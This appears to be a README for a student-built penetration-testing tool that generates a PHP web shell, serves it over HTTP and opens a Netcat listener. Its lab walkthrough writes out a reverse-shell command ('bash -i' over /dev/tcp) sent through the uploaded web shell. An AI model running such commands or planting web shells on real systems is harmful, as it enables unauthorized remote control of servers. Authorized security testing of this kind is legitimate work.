# 💀 Aut0mat1c-Sn1ffer v1.1.0
### *Automated Penetration Testing & Payload Generation Framework*

![License](https://img.shields.io/badge/License-MIT-red.svg)
![Python](https://img.shields.io/badge/Python-3.x-blue.svg)
![Bash](https://img.shields.io/badge/Bash-Scripting-green.svg)

**Aut0mat1c-Sn1ffer** is an all-in-one automation tool designed to streamline the **Exploitation** phase. Unlike standard listeners, this tool **automatically generates a custom PHP Web Shell**, hosts it via a local HTTP server, and prepares a Netcat listener to capture the incoming connection.

---

## ⚡ Key Features
* **Auto-Payload Generation:** Instantly creates a `kabuk.php` backdoor in your workspace.
* **Instant Infrastructure:** Deploys a Python3 HTTP server and a Netcat listener in separate `xterm` windows.
* **Smart Detection:** Automatically detects your local IP to provide ready-to-use Reverse Shell commands.
* **Workspace Management:** Keeps all your exfiltrated data and payloads in a dedicated `/X` directory.



---

## 📖 Practical Scenario (e.g., ninja.testlab.local)

1.  **Launch:** Run `./sniffer.sh`. The tool creates `kabuk.php` and starts the servers.
2.  **Upload:** Upload the generated `kabuk.php` to the target (e.g., `ninja.testlab.local`).
3.  **Execute:** Navigate to the following URL to trigger a Reverse Shell:
    `http://ninja.testlab.local/uploads/kabuk.php?cmd=bash -i >& /dev/tcp/[YOUR_IP]/9999 0>&1`
4.  **Control:** Your second terminal window will immediately grant you shell access to the target system.

---

## 🛡️ Disclaimer
**For Educational and Authorized Testing Only.**
The use of Aut0mat1c-Sn1ffer for attacking targets without prior mutual consent is **illegal**. It is the end user's responsibility to obey all applicable local, state, and federal laws. The developer, **UMIT SAMET TASCI**, assumes no liability and is not responsible for any misuse or damage caused by this program.

---

## 👤 About the Developer
**UMIT SAMET TASCI**
* **Academic Status:** First-year University Student
* **Field of Interest:** Cyber Security, Penetration Testing, and Offensive Tool Development.
* **Tech Stack:** Python, C, Bash, Linux.
* **GitHub:** [@umitsTASCI](https://github.com/umitsTASCI)

---
*Built for professional portfolio development and security research.*
